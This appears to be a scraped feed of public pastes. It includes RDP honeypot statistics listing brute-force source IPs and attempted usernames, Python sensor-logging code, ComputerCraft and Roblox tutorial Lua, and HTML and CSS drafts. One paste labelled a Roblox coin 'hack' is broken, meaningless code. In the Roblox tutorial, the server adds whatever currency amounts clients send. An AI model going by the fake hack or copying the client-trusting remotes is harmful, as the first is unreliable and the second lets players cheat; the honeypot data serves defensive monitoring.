    ""AS135377"": 3,
    ""AS31148"": 3,
    ""AS4134"": 9,
    ""AS2856"": 15,
    ""AS23860"": 3,
    ""AS38283"": 6,
    ""AS701"": 18,
    ""AS14080"": 3
  },
  ""isp"": {
    ""Xhost Internet Solutions LP"": 30,
    ""Flyservers S.A."": 57,
    ""Google LLC"": 36,
    ""Horizon LLC"": 18,
    ""LINODE"": 21,
    ""Aceville Pte.ltd"": 3,
    ""Censys, Inc."": 3,
    ""Huawei International Pte. LTD"": 12,
    ""ODS ONLINE DATA SOLUTION JOINT STOCK COMPANY"": 3,
    ""Akamai Technologies, Inc."": 9,
    ""Rockion LLC"": 3,
    ""Xhost Internet Solutions"": 6,
    ""DigitalOcean, LLC"": 18,
    ""FOP Dmytro Nedilskyi"": 6,
    ""Red Byte LLC"": 9,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""o3 core"": 3,
    ""Chinanet"": 9,
    ""BT Public Internet Service"": 15,
    ""Alliance Broadband Services"": 3,
    ""Ipxo Limited"": 3,
    ""CHINANET SiChuan Telecom Internet Data Center"": 6,
    ""Verizon Business"": 18,
    ""Telmex Colombia S.A."": 3
  },
  ""org"": {
    ""Xhost Internet Solutions"": 15,
    ""UAB Host Baltic"": 12,
    ""Palo Alto Networks, Inc"": 36,
    ""Horizon LLC"": 18,
    ""Linode, LLC"": 21,
    ""Unknown"": 36,
    ""Censys, Inc"": 3,
    ""Thai AN Khang Communication Services Co., LTD"": 3,
    ""Flyservers S.A"": 27,
    ""Linode"": 9,
    ""Ipxo LLC"": 3,
    ""Xhostis"": 15,
    ""XHOSTIS"": 6,
    ""DigitalOcean, LLC"": 18,
    ""FOP Dmytro Nedilskyi"": 6,
    ""Chang Way Technologies Co. Limited"": 9,
    ""Alviva Holding Limited"": 18,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chinanet JS"": 9,
    ""External"": 3,
    ""Chinanet SC"": 6,
    ""Verizon Business"": 18,
    ""Telmex Colombia S.A"": 3
  },
  ""regionName"": {
    ""North Holland"": 39,
    ""Vilnius"": 12,
    ""California"": 48,
    ""Moscow"": 27,
    ""North West"": 24,
    ""Michigan"": 3,
    ""Mexico City"": 12,
    ""Ho Chi Minh"": 3,
    ""New York"": 6,
    ""Dnipropetrovsk Oblast"": 6,
    ""Kaunas"": 24,
    ""Hesse"": 18,
    ""England"": 18,
    ""Zhytomyr"": 3,
    ""Jiangsu"": 9,
    ""New Jersey"": 30,
    ""Georgia"": 3,
    ""Kerala"": 3,
    ""Sichuan"": 6,
    ""Bogota D.C."": 3
  },
  ""country"": {
    ""The Netherlands"": 39,
    ""Lithuania"": 36,
    ""United States"": 90,
    ""Russia"": 27,
    ""Singapore"": 24,
    ""Mexico"": 12,
    ""Vietnam"": 3,
    ""Ukraine"": 9,
    ""Germany"": 18,
    ""United Kingdom"": 18,
    ""China"": 15,
    ""India"": 3,
    ""Colombia"": 3
  },
  ""account"": {
    ""Administr"": 36,
    ""Test"": 42,
    ""LKBXDBOJV"": 3,
    ""kJAffm"": 3,
    ""MYilEz"": 3,
    ""hello"": 63,
    ""(empty)"": 12,
    ""CWWTncZhx"": 3,
    ""ZMTsUv"": 3,
    ""PmBmuA"": 3,
    ""Domain"": 48,
    ""Administrator"": 3,
    ""AgKPjPVAX"": 3,
    ""VWGoOD"": 3,
    ""OonONu"": 3,
    ""4ilvqxru"": 12,
    ""beio"": 3,
    ""nmap"": 6,
    ""142.93.8.59"": 36,
    ""tNousbQJh"": 3,
    ""vYYgwp"": 3,
    ""HGVhnW"": 3
  },
  ""keyboard"": {
    ""Unknown"": 297
  },
  ""client_build"": {
    ""Unknown"": 297
  },
  ""client_name"": {
    ""Unknown"": 297
  },
  ""ip_type"": {
    ""Unknown"": 180,
    ""hosting"": 90,
    ""proxy"": 12,
    ""hosting & proxy"": 12,
    ""mobile & proxy"": 3
  }
}"
3KzbEJvr,2023-12-28_stats.json,rdp_snitch,JSON,Thursday 28th of December 2023 06:16:17 PM CDT,"{
  ""ip"": {
    ""87.251.75.145"": 8,
    ""45.227.254.48"": 4,
    ""198.235.24.213"": 6,
    ""62.204.41.208"": 12,
    ""139.162.5.35"": 14,
    ""43.134.171.213"": 2,
    ""167.94.138.35"": 2,
    ""94.74.64.196"": 8,
    ""103.20.102.235"": 2,
    ""147.78.47.32"": 2,
    ""87.251.75.64"": 2,
    ""45.79.103.72"": 4,
    ""63.135.161.94"": 2,
    ""185.170.144.3"": 4,
    ""193.37.69.79"": 4,
    ""198.235.24.183"": 6,
    ""164.92.94.245"": 4,
    ""31.43.185.3"": 4,
    ""194.165.16.72"": 4,
    ""213.109.202.232"": 6,
    ""81.19.135.47"": 6,
    ""165.154.129.130"": 2,
    ""46.219.77.107"": 2,
    ""58.218.204.183"": 6,
    ""185.170.144.113"": 6,
    ""198.235.24.21"": 6,
    ""146.190.74.163"": 8,
    ""139.144.171.21"": 2,
    ""81.143.229.7"": 10,
    ""103.78.16.176"": 2,
    ""81.19.135.2"": 6,
    ""45.130.83.36"": 2,
    ""118.123.105.93"": 4,
    ""194.165.17.21"": 12,
    ""74.105.22.130"": 12,
    ""190.85.232.116"": 2,
    ""45.227.254.26"": 4,
    ""205.210.31.163"": 6
  },
  ""asn"": {
    ""AS208091"": 14,
    ""AS267784"": 8,
    ""AS396982"": 24,
    ""AS59425"": 12,
    ""AS63949"": 20,
    ""AS132203"": 2,
    ""AS398324"": 2,
    ""AS136907"": 8,
    ""AS140817"": 2,
    ""AS209588"": 14,
    ""AS206092"": 4,
    ""AS197414"": 10,
    ""AS14061"": 12,
    ""AS211736"": 4,
    ""AS48721"": 16,
    ""AS208312"": 6,
    ""AS135377"": 2,
    ""AS31148"": 2,
    ""AS4134"": 6,
    ""AS2856"": 10,
    ""AS23860"": 2,
    ""AS38283"": 4,
    ""AS701"": 12,
    ""AS14080"": 2
  },
  ""isp"": {
    ""Xhost Internet Solutions LP"": 20,
    ""Flyservers S.A."": 38,
    ""Google LLC"": 24,
    ""Horizon LLC"": 12,
    ""LINODE"": 14,
    ""Aceville Pte.ltd"": 2,
    ""Censys, Inc."": 2,
    ""Huawei International Pte. LTD"": 8,
    ""ODS ONLINE DATA SOLUTION JOINT STOCK COMPANY"": 2,
    ""Akamai Technologies, Inc."": 6,
    ""Rockion LLC"": 2,
    ""Xhost Internet Solutions"": 4,
    ""DigitalOcean, LLC"": 12,
    ""FOP Dmytro Nedilskyi"": 4,
    ""Red Byte LLC"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""o3 core"": 2,
    ""Chinanet"": 6,
    ""BT Public Internet Service"": 10,
    ""Alliance Broadband Services"": 2,
    ""Ipxo Limited"": 2,
    ""CHINANET SiChuan Telecom Internet Data Center"": 4,
    ""Verizon Business"": 12,
    ""Telmex Colombia S.A."": 2
  },
  ""org"": {
    ""Xhost Internet Solutions"": 10,
    ""UAB Host Baltic"": 8,
    ""Palo Alto Networks, Inc"": 24,
    ""Horizon LLC"": 12,
    ""Linode, LLC"": 14,
    ""Unknown"": 24,
    ""Censys, Inc"": 2,
    ""Thai AN Khang Communication Services Co., LTD"": 2,
    ""Flyservers S.A"": 18,
    ""Linode"": 6,
    ""Ipxo LLC"": 2,
    ""Xhostis"": 10,
    ""XHOSTIS"": 4,
    ""DigitalOcean, LLC"": 12,
    ""FOP Dmytro Nedilskyi"": 4,
    ""Chang Way Technologies Co. Limited"": 6,
    ""Alviva Holding Limited"": 12,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Chinanet JS"": 6,
    ""External"": 2,
    ""Chinanet SC"": 4,
    ""Verizon Business"": 12,
    ""Telmex Colombia S.A"": 2
  },
  ""regionName"": {
    ""North Holland"": 26,
    ""Vilnius"": 8,
    ""California"": 32,
    ""Moscow"": 18,
    ""North West"": 16,
    ""Michigan"": 2,
    ""Mexico City"": 8,
    ""Ho Chi Minh"": 2,
    ""New York"": 4,
    ""Dnipropetrovsk Oblast"": 4,
    ""Kaunas"": 16,
    ""Hesse"": 12,
    ""England"": 12,
    ""Zhytomyr"": 2,
    ""Jiangsu"": 6,
    ""New Jersey"": 20,
    ""Georgia"": 2,
    ""Kerala"": 2,
    ""Sichuan"": 4,
    ""Bogota D.C."": 2
  },
  ""country"": {
    ""The Netherlands"": 26,
    ""Lithuania"": 24,
    ""United States"": 60,
    ""Russia"": 18,
    ""Singapore"": 16,
    ""Mexico"": 8,
    ""Vietnam"": 2,
    ""Ukraine"": 6,
    ""Germany"": 12,
    ""United Kingdom"": 12,
    ""China"": 10,
    ""India"": 2,
    ""Colombia"": 2
  },
  ""account"": {
    ""Administr"": 24,
    ""Test"": 28,
    ""LKBXDBOJV"": 2,
    ""kJAffm"": 2,
    ""MYilEz"": 2,
    ""hello"": 42,
    ""(empty)"": 8,
    ""CWWTncZhx"": 2,
    ""ZMTsUv"": 2,
    ""PmBmuA"": 2,
    ""Domain"": 32,
    ""Administrator"": 2,
    ""AgKPjPVAX"": 2,
    ""VWGoOD"": 2,
    ""OonONu"": 2,
    ""4ilvqxru"": 8,
    ""beio"": 2,
    ""nmap"": 4,
    ""142.93.8.59"": 24,
    ""tNousbQJh"": 2,
    ""vYYgwp"": 2,
    ""HGVhnW"": 2
  },
  ""keyboard"": {
    ""Unknown"": 198
  },
  ""client_build"": {
    ""Unknown"": 198
  },
  ""client_name"": {
    ""Unknown"": 198
  },
  ""ip_type"": {
    ""Unknown"": 120,
    ""hosting"": 60,
    ""proxy"": 8,
    ""hosting & proxy"": 8,
    ""mobile & proxy"": 2
  }
}"
ZSH9edcZ,2023-12-28_stats.json,rdp_snitch,JSON,Thursday 28th of December 2023 06:15:08 PM CDT,"{
  ""ip"": {
    ""87.251.75.145"": 4,
    ""45.227.254.48"": 2,
    ""198.235.24.213"": 3,
    ""62.204.41.208"": 6,
    ""139.162.5.35"": 7,
    ""43.134.171.213"": 1,
    ""167.94.138.35"": 1,
    ""94.74.64.196"": 4,
    ""103.20.102.235"": 1,
    ""147.78.47.32"": 1,
    ""87.251.75.64"": 1,
    ""45.79.103.72"": 2,
    ""63.135.161.94"": 1,
    ""185.170.144.3"": 2,
    ""193.37.69.79"": 2,
    ""198.235.24.183"": 3,
    ""164.92.94.245"": 2,
    ""31.43.185.3"": 2,
    ""194.165.16.72"": 2,
    ""213.109.202.232"": 3,
    ""81.19.135.47"": 3,
    ""165.154.129.130"": 1,
    ""46.219.77.107"": 1,
    ""58.218.204.183"": 3,
    ""185.170.144.113"": 3,
    ""198.235.24.21"": 3,
    ""146.190.74.163"": 4,
    ""139.144.171.21"": 1,
    ""81.143.229.7"": 5,
    ""103.78.16.176"": 1,
    ""81.19.135.2"": 3,
    ""45.130.83.36"": 1,
    ""118.123.105.93"": 2,
    ""194.165.17.21"": 6,
    ""74.105.22.130"": 6,
    ""190.85.232.116"": 1,
    ""45.227.254.26"": 2,
    ""205.210.31.163"": 3
  },
  ""asn"": {
    ""AS208091"": 7,
    ""AS267784"": 4,
    ""AS396982"": 12,
    ""AS59425"": 6,
    ""AS63949"": 10,
    ""AS132203"": 1,
    ""AS398324"": 1,
    ""AS136907"": 4,
    ""AS140817"": 1,
    ""AS209588"": 7,
    ""AS206092"": 2,
    ""AS197414"": 5,
    ""AS14061"": 6,
    ""AS211736"": 2,
    ""AS48721"": 8,
    ""AS208312"": 3,
    ""AS135377"": 1,
    ""AS31148"": 1,
    ""AS4134"": 3,
    ""AS2856"": 5,
    ""AS23860"": 1,
    ""AS38283"": 2,
    ""AS701"": 6,
    ""AS14080"": 1
  },
  ""isp"": {
    ""Xhost Internet Solutions LP"": 10,
    ""Flyservers S.A."": 19,
    ""Google LLC"": 12,
    ""Horizon LLC"": 6,
    ""LINODE"": 7,
    ""Aceville Pte.ltd"": 1,
    ""Censys, Inc."": 1,
    ""Huawei International Pte. LTD"": 4,
    ""ODS ONLINE DATA SOLUTION JOINT STOCK COMPANY"": 1,
    ""Akamai Technologies, Inc."": 3,
    ""Rockion LLC"": 1,
    ""Xhost Internet Solutions"": 2,
    ""DigitalOcean, LLC"": 6,
    ""FOP Dmytro Nedilskyi"": 2,
    ""Red Byte LLC"": 3,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""o3 core"": 1,
    ""Chinanet"": 3,
    ""BT Public Internet Service"": 5,
    ""Alliance Broadband Services"": 1,
    ""Ipxo Limited"": 1,
    ""CHINANET SiChuan Telecom Internet Data Center"": 2,
    ""Verizon Business"": 6,
    ""Telmex Colombia S.A."": 1
  },
  ""org"": {
    ""Xhost Internet Solutions"": 5,
    ""UAB Host Baltic"": 4,
    ""Palo Alto Networks, Inc"": 12,
    ""Horizon LLC"": 6,
    ""Linode, LLC"": 7,
    ""Unknown"": 12,
    ""Censys, Inc"": 1,
    ""Thai AN Khang Communication Services Co., LTD"": 1,
    ""Flyservers S.A"": 9,
    ""Linode"": 3,
    ""Ipxo LLC"": 1,
    ""Xhostis"": 5,
    ""XHOSTIS"": 2,
    ""DigitalOcean, LLC"": 6,
    ""FOP Dmytro Nedilskyi"": 2,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Alviva Holding Limited"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Chinanet JS"": 3,
    ""External"": 1,
    ""Chinanet SC"": 2,
    ""Verizon Business"": 6,
    ""Telmex Colombia S.A"": 1
  },
  ""regionName"": {
    ""North Holland"": 13,
    ""Vilnius"": 4,
    ""California"": 16,
    ""Moscow"": 9,
    ""North West"": 8,
    ""Michigan"": 1,
    ""Mexico City"": 4,
    ""Ho Chi Minh"": 1,
    ""New York"": 2,
    ""Dnipropetrovsk Oblast"": 2,
    ""Kaunas"": 8,
    ""Hesse"": 6,
    ""England"": 6,
    ""Zhytomyr"": 1,
    ""Jiangsu"": 3,
    ""New Jersey"": 10,
    ""Georgia"": 1,
    ""Kerala"": 1,
    ""Sichuan"": 2,
    ""Bogota D.C."": 1
  },
  ""country"": {
    ""The Netherlands"": 13,
    ""Lithuania"": 12,
    ""United States"": 30,
    ""Russia"": 9,
    ""Singapore"": 8,
    ""Mexico"": 4,
    ""Vietnam"": 1,
    ""Ukraine"": 3,
    ""Germany"": 6,
    ""United Kingdom"": 6,
    ""China"": 5,
    ""India"": 1,
    ""Colombia"": 1
  },
  ""account"": {
    ""Administr"": 12,
    ""Test"": 14,
    ""LKBXDBOJV"": 1,
    ""kJAffm"": 1,
    ""MYilEz"": 1,
    ""hello"": 21,
    ""(empty)"": 4,
    ""CWWTncZhx"": 1,
    ""ZMTsUv"": 1,
    ""PmBmuA"": 1,
    ""Domain"": 16,
    ""Administrator"": 1,
    ""AgKPjPVAX"": 1,
    ""VWGoOD"": 1,
    ""OonONu"": 1,
    ""4ilvqxru"": 4,
    ""beio"": 1,
    ""nmap"": 2,
    ""142.93.8.59"": 12,
    ""tNousbQJh"": 1,
    ""vYYgwp"": 1,
    ""HGVhnW"": 1
  },
  ""keyboard"": {
    ""Unknown"": 99
  },
  ""client_build"": {
    ""Unknown"": 99
  },
  ""client_name"": {
    ""Unknown"": 99
  },
  ""ip_type"": {
    ""Unknown"": 60,
    ""hosting"": 30,
    ""proxy"": 4,
    ""hosting & proxy"": 4,
    ""mobile & proxy"": 1
  }
}"
FnfZz1vZ,Link,bluebyt,INI file,Thursday 28th of December 2023 05:57:03 PM CDT,https://itsfoss.com/flatpak-app-apply-theme/
SwYaQmGg,newloop,aalh,Python,Thursday 28th of December 2023 05:18:18 PM CDT,"        t_stamp = time.mktime(gps.timestamp_utc)
        PLOG_FILE = f""{t_stamp}pressure.txt""
        start = time.monotonic_ns()
        deadline = start / 1e9 + 60
        with open((plog_path+PLOG_FILE), LOG_MODE) as pressfile:
            debugp(t_stamp, gps.latitude, gps.longitude, gps.altitude_m)
            curr_time = start
            while curr_time < deadline:
                curr_time = (time.monotonic_ns() - start) / 1e9
                debugp(curr_time), lps.pressure)
"
vSPPTQ3m,🔥🔥 Roblox Strucid coin multiplier | hack  🔥🔥,droui,Lua,Thursday 28th of December 2023 05:14:27 PM CDT,"                                             game.service.LocalPlayer(""service""):GetService()
                                                  local player = game.kill.killstreak()
                                                        function kill(multiplier)
                                                                      end
                                                    if kill == kill.multiplier and coins
                                                                      end 
                                            wait until player.kill == player.kill.coins.amount
                                                                 task.do(kill)        
                                                     if kill == coins.amount > + 40,000
                                                                      end"
4myxSFEx,pressure loop,aalh,Python,Thursday 28th of December 2023 04:56:45 PM CDT,"        with open((plog_path+PLOG_FILE), LOG_MODE) as pressfile:
            debugp(t_stamp, gps.latitude, gps.longitude, gps.altitude_m)
            while ((time.monotonic_ns() - timep) / 1000000000) >= 60:
                if stamped is False:
                    
                    stamped = True
                debugp(((time.monotonic_ns() - timep) / 1000000000), lps.pressure)
"
adXAHELb,Todo List,markaplet,Lua,Thursday 28th of December 2023 04:53:44 PM CDT,"-- ChatGPT Code Test to display configurable list on 2x2 monitors.
-- Configurable list of text
local textList = {
    ""Hello, ComputerCraft!"",
    ""Welcome to the script!"",
    ""Feel free to customize this list."",
    ""Enjoy coding with Lua!""
}

-- Function to clear the monitor screen
local function clearScreen()
    term.clear()
    term.setCursorPos(1, 1)
end

-- Function to display text on the monitor
local function displayTextOnMonitor()
    clearScreen()

    -- Calculate the maximum number of lines that can fit on the monitor
    local maxLines = 4

    -- Display each line of text on the monitor
    for i = 1, maxLines do
        local line = textList[i]
        if line then
            print(line)
        else
            break
        end
    end
end

-- Main loop to continuously display text
while true do
    displayTextOnMonitor()
    os.sleep(5) -- Adjust the sleep duration as needed
end
"
gpyrcnWK,client,Larvix,Lua,Thursday 28th of December 2023 04:15:09 PM CDT,"shell.run(""clear"")
modem = peripheral.find(""modem"")
if not modem then
	print(""Modem Required"")
else

rednet.open(peripheral.getName(modem))
if fs.exists(""server.txt"") then
    file = fs.open(""server.txt"",""r"")
    sID = file.readLine()
    file.close()
end
 
displayHive = function()
    x,y = term.getCursorPos()
    term.setCursorPos(1,1)
    term.clearLine()
    write(""Hive: #"")
    if sID then
        print(sID)
    else
        print(""----"")
    end
    if y < 2 then y = 2 end
    term.setCursorPos(x,y)
end

local leaveHive = function()
    rednet.send(tonumber(sID),nil,""hive.leave"")
    if fs.exists(""server.txt"") then
        fs.delete(""server.txt"")
        sID = nil
    end
end

local joinHive = function()
    if sID then
        leaveHive()
    end
    rednet.broadcast(nil,cmd)
    sID = rednet.receive(1)
    if not sID then
        print(""[Connection Failed]"")
    else 
        file = fs.open(""server.txt"",""w"")
        file.write(tostring(sID))
        file.close()
    end
end
 
while true do
    displayHive()
    cmd = read()
	cmd = ""hive.""..cmd
    if cmd:sub(1,9) == ""hive.join"" then
        cmd = cmd:gsub("" "",""#"")
        joinHive()
    else
        if sID then 
            if cmd == ""hive.leave"" then
                leaveHive()
            elseif cmd:sub(1,9) == ""hive.ping"" then
                if #cmd > 10 then
                    ping = cmd:sub(11,#cmd)
                else
                    ping = ""ping""
                end            
                rednet.send(tonumber(sID),ping,""hive.ping"")
            end
        end
    end
end

end"
7v2g7vNe,network,Larvix,Lua,Thursday 28th of December 2023 04:14:43 PM CDT,"args = {...}
if args[1] == ""client"" or args[1] == ""server"" then
	type = args[1]
else type = ""client"" end

server = function()
if fs.exists(""network.txt"") then
    file = fs.open(""network.txt"",""r"")
    clients = file.readAll()
    clients = textutils.unserialise(clients)
    file.close()
else clients = {} end
 
connected = function(id)
    exists = false
    for i = 1,#clients do
        if clients[i] == id then
            exists = true
        end
    end
    return exists
end
 
local listen = function()
    id,data,cmd = rednet.receive()
    if cmd:sub(1,5) == ""hive."" then
        cmd = cmd:sub(6,#cmd)
        if cmd:sub(1,5) == ""join#"" and cmd:sub(6,#cmd) == tostring(os.getComputerID()) then
            if not connected(id) then
                rednet.send(id,nil)
                table.insert(clients, id)
            end
        elseif connected(id) then
            if cmd == ""leave"" then
                for i = 1,#clients do
                    if clients[i] == id then
                        table.remove(clients,i)
                    end
                end
            elseif cmd == ""ping"" then
                print(id.."":""..data)
            end
        end
	end
end

displayServer = function()
    mx,my = term.getSize()
    me = ""Hive #""..os.getComputerID()
    x,y = term.getCursorPos()
    term.setCursorPos(1,1)
    term.clearLine()
    write(""Members: ""..#clients)
    term.setCursorPos(mx-#me+1,1)
    write(me)
    if y < 2 then y = 2 end
    term.setCursorPos(x,y)
end
 
while true do
	displayServer()
    memberCount = #clients
    listen()
    if #clients == 0 and fs.exists(""network.txt"") then
        fs.delete(""network.txt"")
    elseif #clients ~= memberCount then
        file = fs.open(""network.txt"",""w"")
        file.write(textutils.serialise(clients))
        file.close()
    end
end
end

client = function()
if fs.exists(""server.txt"") then
    file = fs.open(""server.txt"",""r"")
    sID = file.readLine()
    file.close()
end
 
displayHive = function()
    x,y = term.getCursorPos()
    term.setCursorPos(1,1)
    term.clearLine()
    write(""Hive: #"")
    if sID then
        print(sID)
    else
        print(""----"")
    end
    if y < 2 then y = 2 end
    term.setCursorPos(x,y)
end

local leaveHive = function()
    rednet.send(tonumber(sID),nil,""hive.leave"")
    if fs.exists(""server.txt"") then
        fs.delete(""server.txt"")
        sID = nil
		shell.run(""clear"")
    end
end

local joinHive = function()
    if sID then
        leaveHive()
    end
    rednet.broadcast(nil,cmd)
    sID = rednet.receive(1)
    if not sID then
        print(""[Connection Failed]"")
    else 
        file = fs.open(""server.txt"",""w"")
        file.write(tostring(sID))
        file.close()
    end
end
 
while true do
    displayHive()
    cmd = read()
    if cmd == ""clear"" then
		shell.run(""clear"")
	else
		cmd = ""hive.""..cmd
    	if cmd:sub(1,9) == ""hive.join"" then
        	cmd = cmd:gsub("" "",""#"")
        	joinHive()
    	else
        	if sID then 
            	if cmd == ""hive.leave"" then
                	leaveHive()
            	elseif cmd:sub(1,9) == ""hive.ping"" then
                	if #cmd > 10 then
                    	ping = cmd:sub(11,#cmd)
                	else
                    	ping = ""ping""
                	end            
                	rednet.send(tonumber(sID),ping,""hive.ping"")
            	end
        	end
    	end
	end
end
end

-- Run program
shell.run(""clear"")
modem = peripheral.find(""modem"")
if not modem then
    print(""Modem Required"")
else
rednet.open(peripheral.getName(modem))
	if type == ""client"" then
		client()
	elseif type == ""server"" then
		server()
	end
end"
ipd2PZZ7,cyber alliance draft 12,Anonx0,HTML 5,Thursday 28th of December 2023 03:33:03 PM CDT,"<!doctype html>
<html lang=""es"">
  <head>
    <meta charset=""utf-8"">
    <link href=""main.css"" rel=""stylesheet"">
    <title></title>
  </head>
  <body>
    <header>
      <h1>
        <abbr lang=""en"" title=""HyperText Markup Language"">HTML</abbr>
      </h1>
      <p>Estándar bifurcado por <span lang=""en"">Cyber Alliance</span>. Última revisión: <time datetime=""1704067200"">1 de enero de 2024</time>.</p>
    </header>
    <hr>
    <main>
      <section data-ref=""alpha-0"">
        <h2>Sumario</h2>
        <details>
          <summary>Capítulos</summary>
          <div class=""detailsBox"">
            <nav>
              <ol start=""2"">
                <li>Puesta en escena</li>
              </ol>
            </nav>
          </div>
        </details>
      </section>
    </main>
    <footer></footer>
  </body>
</html>"
6rn9fG9j,cyber alliance css draft 20,Anonx0,CSS,Thursday 28th of December 2023 03:25:31 PM CDT,":root {
  --blood: #ef5956;
  --crimson: #d33131;
  --light: #ffffff;
}

html {
  font: 16px/1 system-ui;
  height: 100%;
}

body {
  margin: 0;
  padding: 5rem;
}

header {}

h1 {
  color: var(--crimson);
  font-size: 5rem;
  font-weight: 1000;
  margin: 0 0 2rem;
}

abbr {
  display: inline-block;
  text-decoration: none;
}

p {
  line-height: 1.5;
  margin: 0 0 1rem;
}

span {
  display: inline-block;
}

time {
  display: inline-block;
}

hr {
  background: var(--crimson);
  border: 0;
  height: .2rem;
  margin: 0 0 1rem;
}

main {}

section {}

h2 {
  color: var(--crimson);
  font-size: 2rem;
  font-weight: 1000;
  margin: 0 0 1rem;
}

details {
  border: .2rem solid var(--crimson);
}

summary {
  background: var(--blood);
  color: var(--light);
  cursor: pointer;
  list-style: none;
  padding: 1rem;
}

details[open] summary {
  background: var(--crimson);
}

.detailsBox {
  padding: 1rem;
}

nav {}

ol {
  margin: 0;
  padding-left: 1rem;
}

li {}

footer {}

@media (min-width: 1000px) {
  html {
    background: var(--blood);
    display: grid;
    justify-content: center;
  }

  body {
    background: var(--light);
    border-left: .2rem solid var(--crimson);
    border-right: .2rem solid var(--crimson);
    box-sizing: border-box;
    width: 1000px;
  }

  header {}

  h1 {}

  abbr {}

  p {}

  span {}

  time {}

  hr {}

  main {}

  section {}

  h2 {}

  details {}

  summary {}

  details[open] summary {}

  .detailsBox {}

  nav {}

  ol {}

  li {}

  footer {}
}"
ry6fcidd,pressure loop,aalh,Python,Thursday 28th of December 2023 03:19:15 PM CDT,"class Pressure_State(Time_State):
    """"""This state records a pressure log """"""

    def __init__(self):
        super().__init__()

    @property
    def name(self):
        return 'pressurel'

    def tick(self, now):
        # Once the job is done, go back to the main screen
        change_to_state('time')

    def enter(self):
        global low_light, pressfile, PLOG_FILE, LOG_MODE, current_time
        low_light = False
        stamped = False
        plog_path = ""/sd/""
        pyportal.set_backlight(1.00)
        pyportal.set_background(mugsy_background)
        try:
            board.DISPLAY.refresh(target_frames_per_second=60)
        except AttributeError:
            board.DISPLAY.refresh_soon()
            board.DISPLAY.wait_for_frame()
        gps.update()
        t_stamp = time.mktime(gps.timestamp_utc)
        PLOG_FILE = f""{t_stamp}pressure.txt""
        loop = 1200
        timep = time.monotonic_ns()
        while loop > 0:
            with open((plog_path+PLOG_FILE), LOG_MODE) as pressfile:
                if stamped is False:
                    debugp(t_stamp, gps.latitude, gps.longitude, gps.altitude_m)
                    stamped = True
                debugp(((time.monotonic_ns() - timep) / 1000000000), lps.pressure)
            loop -= 1
"
CXmC32q6,cyber alliance draft 11,Anonx0,HTML 5,Thursday 28th of December 2023 03:06:51 PM CDT,"<!doctype html>
<html lang=""es"">
  <head>
    <meta charset=""utf-8"">
    <link href=""main.css"" rel=""stylesheet"">
    <title></title>
  </head>
  <body>
    <header>
      <h1>
        <abbr lang=""en"" title=""HyperText Markup Language"">HTML</abbr>
      </h1>
      <p>Estándar bifurcado por <span lang=""en"">Cyber Alliance</span>. Última revisión: <time datetime=""1704067200"">1 de enero de 2024</time>.</p>
    </header>
    <hr>
    <main>
      <section data-ref=""alpha-0"">
        <h2>Sumario</h2>
        <details>
          <summary>Capítulos</summary>
          <div class=""detailsBox"">
            <nav>
              <ol>
                <li>Puesta en escena</li>
              </ol>
            </nav>
          </div>
        </details>
      </section>
    </main>
    <footer></footer>
  </body>
</html>"
wYAtXWH5,l17 destroyDrop2,giganciprogramowania,Lua,Thursday 28th of December 2023 02:57:06 PM CDT,"-- Poprzedni kod aż do funkcji destroyDrop
-- dodaliśmy lucky i reward jako parametry funkcji
local function destroyDrop(drop, lucky, reward)
    task.spawn(function()
   	 local oldParent = drop.Parent
   	 drop.Parent = despawnedDrops
-- Tu pojawił się nowy kod
   	 task.spawn(function()
   		 if lucky == true then
   			 local luck = UX.Luck:Clone()
   			 local luckText = luck.LuckDisplay.LuckFrame.LuckText
   			 local mesh = drop:FindFirstChildWhichIsA(""MeshPart"")
   			 luck.Position = mesh.Position
   			 luckText.Text = ""Lucky Find! +"" .. reward .. "" Shards!""
   			 luck.Parent = oldParent    
   			 wait(5)
   			 luck:Destroy()
   		 end
   	 end)
 -- Tu kończy się nowy kod     	 
       	if drop.Name == ""BigChest"" then	"
mNKUp0rp,l17 updateDamage,giganciprogramowania,Lua,Thursday 28th of December 2023 02:56:18 PM CDT,"-- Zjeżdżamy do funkcji updateDamage i szykamy pętli 			
for i, item in pairs(drop:GetChildren()) do
					-- Sprawdzenie, czy nazwa elementu to ""Reward""
					if item.Name == ""Reward"" then
						-- Wywołanie zdalnej funkcji 'Bank', przekazując wartość nagrody i
						-- ilość nagród do dodania do konta gracza
						remotes.Bank:FireServer(""+"", item.Value, item.Amount.Value)
						
						
					end
				end
-- ====================================Tu zaczyna się nowy kod========================================
				local lucky = false -- przygotowujemy się do UX
				local reward = 0
				local random = math.random(1,100)
				local loot = require(drops.Loot)
				local name = drop.Name
				local shardDrop = loot.drop
				for i, v in pairs(shardDrop) do
					if name == i then
						if v.chance >= random then
							reward = v.reward
							remotes.Shards:FireServer(reward)
							lucky = true -- przygotowanie do UX
-- po zapisaniu poniższej linii szukamy funkcji destroyDrop i dopisujemy do niej takie same parametry (lucky, reward) jak w tym nawiasie
							destroyDrop(drop, lucky, reward) 
							break
						else
							destroyDrop(drop)
						end
					end
				end
-- ====================================Tu kończy się nowy kod========================================
				--	usuwamy poniższą linijkę
				destroyDrop(drop)"
QAd5YGHP,l17 dataServer,giganciprogramowania,Lua,Thursday 28th of December 2023 02:55:28 PM CDT,"-- Znajdujemy funckję LoadData i szukamy następującego fragmentu:
for key, folder in pairs(data) do
	if key == ""leaderstats"" then
    	for item, amount in pairs(folder) do
        	if item == ""Coins"" then
            	player.leaderstats.Coins.Value = amount
            elseif item == ""Diamonds"" then
                player.leaderstats.Diamonds.Value = amount
-- Dodajemy nowy kod
            elseif item == ""Shards"" then
                player.leaderstats.Shards.Value = amount
-- Koniec nowego kodu
-- Dalszy kod aż do następującego fragmentu:
bank.OnServerEvent:Connect(function(player, action, currency, amount)
    if action == ""+"" then
        if currency == ""Coins"" then
            player.leaderstats.Coins.Value += amount
        elseif currency == ""Diamonds"" then
            player.leaderstats.Diamonds.Value += amount
-- Dodajemy nowy fragment kodu
        elseif currency == ""Shards"" then
            player.leaderstats.Shards.Value += amount
-- Koniec nowego kodu
-- Docieramy do końca istniejącego kodu i dodajemy
local shards = remotes.Shards
shards.OnServerEvent:Connect(function(player, drop)
